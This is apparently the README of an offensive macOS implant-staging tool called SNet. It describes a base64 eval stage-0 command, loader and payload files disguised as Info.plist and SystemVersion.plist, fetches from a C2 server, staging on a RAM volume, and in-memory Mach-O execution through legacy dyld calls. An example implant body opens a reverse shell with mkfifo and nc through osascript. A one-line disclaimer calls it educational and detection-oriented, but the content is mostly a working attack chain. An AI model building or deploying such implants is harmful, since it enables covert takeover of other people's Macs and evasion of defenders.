![alt-text](Captures/logo.png)

# SNet - Make My Implant Call Again

Of the same essence as [PyleLess](https://github.com/therealcoiffeur/PyleLess)
SNet is experimenting with unconventional payload staging and execution for
macOS.

## Generate command

> SNet uses the same initial execution technique as [PyleLess](https://github.com/therealcoiffeur/PyleLess).

<u>Command:</u>

```bash
python3 generate.py
```

<u>Output:</u>

```
[+] Stage 0 written to: ./build/stage0.txt
[+] Stage 1 written to: ./build/Info.plist
[+] Stage 2 written to: ./build/SystemVersion.plist
```

Based on the [PyleLess](https://github.com/therealcoiffeur/PyleLess) technique,
stage 0 looks like the following command.

```
python3 -B -c 'import base64;code="...";eval(compile(base64.b64decode(code),"<string>","exec"))'
```

## Architecture

The modules `rame` and `wassup` demonstrate downloading a staged file onto an
ephemeral RAM volume and executing a Mach-O bundle directly from memory through
the legacy `dyld` APIs.

These proofs of concept help study implant reactivation, file masquerading,
memory execution, and the detection opportunities these techniques expose.

```mermaid
flowchart TD
    subgraph generation["wassup: generate the staged files"]
        generate_sh["generate.sh"] -->|"python3 -B generate.py"| generate_py["generate.py"]
        c_source["Embedded C source<br/>exports run()"] --> generate_py
        generate_py -->|"clang -bundle"| macho["64-bit Mach-O bundle<br/>MH_BUNDLE, exported _run"]
        macho -->|"Base64 encode"| system_plist["SystemVersion.plist<br/>Base64 Mach-O payload"]
        wassup_py["wassup.py<br/>Python loader"] -->|"copy byte-for-byte"| info_plist["Info.plist<br/>masquerading Python script"]
        generate_py --> info_plist
    end

    subgraph server["C2 server"]
        http["python3 -m http.server"]
        info_plist --> http
        system_plist --> http
    end

    subgraph rame["rame: stage the loader on an ephemeral volume"]
        rame_sh["rame.sh"] -->|"python3 -B rame.py"| rame_py["rame.py"]
        rame_py -->|"hdiutil attach ram://..."| ram_device["RAM-backed disk device"]
        ram_device -->|"diskutil eraseVolume HFS+ Recovery"| recovery["/Volumes/Recovery"]
        rame_py -->|"GET /Info.plist"| http
        http -->|"Info.plist"| staged_loader["/Volumes/Recovery/Info.plist"]
        recovery --> staged_loader
        rame_py -->|"python3 -B"| staged_loader
    end

    subgraph execution["wassup: load and execute from memory"]
        staged_loader -->|"GET /SystemVersion.plist"| http
        http -->|"Base64 payload"| loader_memory["Decode and validate in memory<br/>64-bit MH_BUNDLE"]
        loader_memory -->|"NSCreateObjectFileImageFromMemory"| object_image["dyld object-file image"]
        object_image -->|"NSLinkModule"| linked_module["Private in-memory module"]
        linked_module -->|"lookup _run and call it"| run_symbol["run()"]
        run_symbol -->|"fopen / fputs / fclose"| proof["/private/tmp/LOL<br/>Coiffeur is saying 'Wassup!'..."]
        run_symbol --> forced_exit["wassup.py exits with status 69<br/>intentionally, after run() returns"]
    end

    forced_exit -->|"subprocess.CalledProcessError"| error["rame.py prints the command error"]
    error -->|"exception cleanup"| detach["hdiutil detach RAM device"]
```

## Implant replacement

All you need to do is modify `SOURCE` in `wassup/generate.py` (you may need to
update the build options to add the necessary dependencies).

File: `wassup/generate.py`
```python
...

SOURCE = r"""
#import <Foundation/Foundation.h>

__attribute__((visibility("default")))
int run(void)
{
    NSTask *task = [[NSTask alloc] init];

    task.executableURL = [NSURL fileURLWithPath:@"/usr/bin/osascript"];

    task.arguments = @[
        @"-l",
        @"JavaScript",
        @"-e",
        @"ObjC.import('Foundation'); var app = Application.currentApplication();app.includeStandardAdditions = true; app.doShellScript(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|/usr/bin/nc 127.0.0.1 1337 >/tmp/f\");"
    ];

    task.standardOutput = [NSFileHandle fileHandleWithNullDevice];
    task.standardError = [NSFileHandle fileHandleWithNullDevice];

    NSError *error = nil;

    if (![task launchAndReturnError:&error])
        return -1;

    [task waitUntilExit];

    return (int)task.terminationStatus;
}
"""

...

```

## Information

This tool is for educational purposes and allows you to experiment with the
macOS environment.
